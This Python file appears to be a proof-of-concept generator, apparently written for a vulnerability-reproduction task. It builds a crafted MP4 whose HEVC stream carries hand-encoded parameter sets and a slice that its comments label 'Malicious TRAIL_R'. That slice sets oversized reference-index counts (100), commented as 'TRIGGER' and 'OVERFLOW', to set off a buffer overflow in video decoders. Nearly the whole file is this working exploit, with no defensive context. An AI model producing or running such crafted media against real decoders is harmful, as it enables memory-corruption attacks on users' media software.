import struct

class BitStream:
    def __init__(self):
        self.bits = ""
    def write(self, val, n):
        self.bits += f'{val:0{n}b}'
    def write_ue(self, val):
        if val == 0:
            self.bits += "1"
        else:
            tmp = val + 1
            bin_str = bin(tmp)[2:]
            lz = len(bin_str) - 1
            self.bits += "0" * lz + bin_str
    def write_se(self, val):
        if val <= 0:
            val = -val
            val = (val << 1)
        else:
            val = (val << 1) - 1
        self.write_ue(val)
    def byte_align(self):
        if len(self.bits) % 8 != 0:
            self.bits += "1" 
            while len(self.bits) % 8 != 0:
                self.bits += "0"
    def get_bytes(self):
        self.byte_align()
        b = bytearray()
        for i in range(0, len(self.bits), 8):
            b.append(int(self.bits[i:i+8], 2))
        return bytes(b)

class Solution:
    def solve(self, src_path: str) -> bytes:
        # 1. VPS Payload (Main Profile)
        bs = BitStream()
        bs.write(0, 4); bs.write(1, 1); bs.write(1, 1); bs.write(0, 6); bs.write(0, 3); bs.write(1, 1); bs.write(0xFFFF, 16)
        bs.write(0, 2); bs.write(0, 1); bs.write(1, 5); bs.write(0x60000000, 32); 
        bs.write(1, 1); bs.write(0, 1); bs.write(0, 1); bs.write(1, 1); bs.write(0, 44); bs.write(30, 8);
        bs.write(0, 1); bs.write_ue(0); bs.write_ue(0); bs.write_ue(0); bs.write(0, 6); bs.write_ue(0); bs.write(0, 1); bs.write(0, 1)
        vps = b'\x40\x01' + bs.get_bytes()

        # 2. SPS Payload (Main Profile, 64x64, SAO enabled)
        bs = BitStream()
        bs.write(0, 4); bs.write(0, 3); bs.write(1, 1)
        bs.write(0, 2); bs.write(0, 1); bs.write(1, 5); bs.write(0x60000000, 32); 
        bs.write(1, 1); bs.write(0, 1); bs.write(0, 1); bs.write(1, 1); bs.write(0, 44); bs.write(30, 8);
        bs.write_ue(0); bs.write_ue(1); bs.write_ue(64); bs.write_ue(64); bs.write(0, 1)
        bs.write_ue(0); bs.write_ue(0); bs.write_ue(0); bs.write(1, 1); bs.write_ue(0); bs.write_ue(0); bs.write_ue(0)
        bs.write_ue(0); bs.write_ue(0); bs.write_ue(0); bs.write_ue(0); bs.write_ue(0); bs.write_ue(0)
        bs.write(0, 1); bs.write(0, 1); bs.write(1, 1); bs.write(0, 1); bs.write_ue(0); bs.write(0, 1); bs.write(1, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1)
        sps = b'\x42\x01' + bs.get_bytes()

        # 3. PPS Payload
        bs = BitStream()
        bs.write_ue(0); bs.write_ue(0); bs.write(0, 1); bs.write(0, 1); bs.write(0, 3); bs.write(0, 1); bs.write(0, 1)
        bs.write_ue(0); bs.write_ue(0); bs.write_se(0); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write_se(0); bs.write_se(0)
        bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(1, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write_ue(0); bs.write(0, 1); bs.write(0, 1)
        pps = b'\x44\x01' + bs.get_bytes()

        # 4. Slice NAL (Malicious TRAIL_R)
        bs = BitStream()
        bs.write(1, 1) # first_slice_segment_in_pic_flag
        bs.write_ue(0) # slice_pic_parameter_set_id
        bs.write_ue(0) # slice_type=B
        bs.write(1, 1) # slice_sao_luma_flag
        bs.write(1, 1) # slice_sao_chroma_flag
        bs.write(1, 1) # slice_temporal_mvp_enabled_flag
        bs.write(1, 1) # num_ref_idx_active_override_flag (TRIGGER)
        bs.write_ue(100) # num_ref_idx_l0_active_minus1 (OVERFLOW)
        bs.write_ue(100) # num_ref_idx_l1_active_minus1 (OVERFLOW)
        bs.write(1, 1) # mvd_l1_zero_flag
        bs.write(1, 1) # collocated_from_l0_flag
        bs.write_ue(0) # five_minus_max_num_merge_cand
        slice_nal = b'\x02\x01' + bs.get_bytes()

        # Build MP4
        def box(t, d): return struct.pack('>I', 8+len(d)) + t + d
        
        ftyp = b'\x00\x00\x00\x18\x66\x74\x79\x70\x69\x73\x6f\x6d\x00\x00\x02\x00\x69\x73\x6f\x6d\x69\x73\x6f\x32'
        
        mdat_payload = struct.pack('>I', len(slice_nal)) + slice_nal
        
        mvhd = box(b'mvhd', b'\x00'*12 + b'\x00\x00\x03\xe8' + b'\x00\x00\x00\x00' + b'\x00\x01\x00\x00' + b'\x01\x00' + b'\x00\x00' + b'\x00\x00\x00\x00'*2 + b'\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00' + b'\x00\x00\x00\x00'*6 + b'\x00\x00\x00\x02')
        
        hvcC_content = bytearray([1, 1, 0x60, 0, 0, 0, 0x90, 0, 0, 0, 0, 0, 30, 0xF0, 0x00, 0xFC, 0xFD, 0xF8, 0xF8, 0, 0, 0x0F, 3])
        hvcC_content += b'\x20\x00\x01' + struct.pack('>H', len(vps)) + vps
        hvcC_content += b'\x21\x00\x01' + struct.pack('>H', len(sps)) + sps
        hvcC_content += b'\x22\x00\x01' + struct.pack('>H', len(pps)) + pps
        
        hvcC = box(b'hvcC', bytes(hvcC_content))
        hvc1 = box(b'hvc1', b'\x00'*6 + b'\x00\x01' + b'\x00\x00' + b'\x00\x00'*3 + b'\x00\x40\x00\x40\x00\x48\x00\x18' + b'\x00\x00' + b'\x00\x48\x00\x00' + b'\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\xff\xff' + hvcC)
        stsd = box(b'stsd', b'\x00\x00\x00\x00' + b'\x00\x00\x00\x01' + hvc1)
        stts = box(b'stts', b'\x00\x00\x00\x00' + b'\x00\x00\x00\x01' + b'\x00\x00\x00\x01' + b'\x00\x00\x00\x00')
        stsc = box(b'stsc', b'\x00\x00\x00\x00' + b'\x00\x00\x00\x01' + b'\x00\x00\x00\x01' + b'\x00\x00\x00\x01' + b'\x00\x00\x00\x01')
        stsz = box(b'stsz', b'\x00\x00\x00\x00' + b'\x00\x00\x00\x00' + b'\x00\x00\x00\x01' + struct.pack('>I', len(mdat_payload)))
        
        stbl_no_stco = stsd + stts + stsc + stsz
        
        # Calculate offset for stco
        # ftyp(24) + moov(header 8 + mvhd 116 + trak(header 8 + tkhd 100 + mdia(header 8 + mdhd 40 + hdlr 53 + minf(header 8 + vmhd 28 + dinf 44 + stbl(header 8 + content + stco 16)))))
        # moov_size = 8 + 116 + 8 + 100 + 8 + 40 + 53 + 8 + 28 + 44 + 8 + len(stbl_no_stco) + 16
        moov_size = 8 + 116 + 8 + 100 + 8 + 40 + 53 + 8 + 28 + 44 + 8 + len(stbl_no_stco) + 16
        offset = 24 + moov_size
        
        stco = box(b'stco', b'\x00\x00\x00\x00' + b'\x00\x00\x00\x01' + struct.pack('>I', offset))
        stbl = box(b'stbl', stbl_no_stco + stco)
        minf = box(b'minf', box(b'vmhd', b'\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00') + box(b'dinf', box(b'dref', b'\x00\x00\x00\x00' + b'\x00\x00\x00\x01' + box(b'url ', b'\x00\x00\x00\x01'))) + stbl)
        mdia = box(b'mdia', box(b'mdhd', b'\x00'*4 + b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\xe8\x00\x00\x00\x00\x55\xc4\x00\x00') + box(b'hdlr', b'\x00\x00\x00\x00' + b'\x00\x00\x00\x00' + b'vide' + b'\x00'*12 + b'VideoHandler\x00') + minf)
        tkhd = box(b'tkhd', b'\x00\x00\x00\x01' + b'\x00\x00\x00\x00' * 2 + b'\x00\x00\x00\x01' + b'\x00'*12 + b'\x00\x00\x00\x00'*2 + b'\x00\x01\x00\x00' + b'\x00'*12 + b'\x00\x00\x00\x00' + b'\x40\x00\x00\x00' + b'\x00\x00\x00\x00' + b'\x00\x40\x00\x00')
        trak = box(b'trak', tkhd + mdia)
        moov = box(b'moov', mvhd + trak)
        
        mdat = struct.pack('>I', 8 + len(mdat_payload)) + b'mdat' + mdat_payload
        
        return ftyp + moov + mdat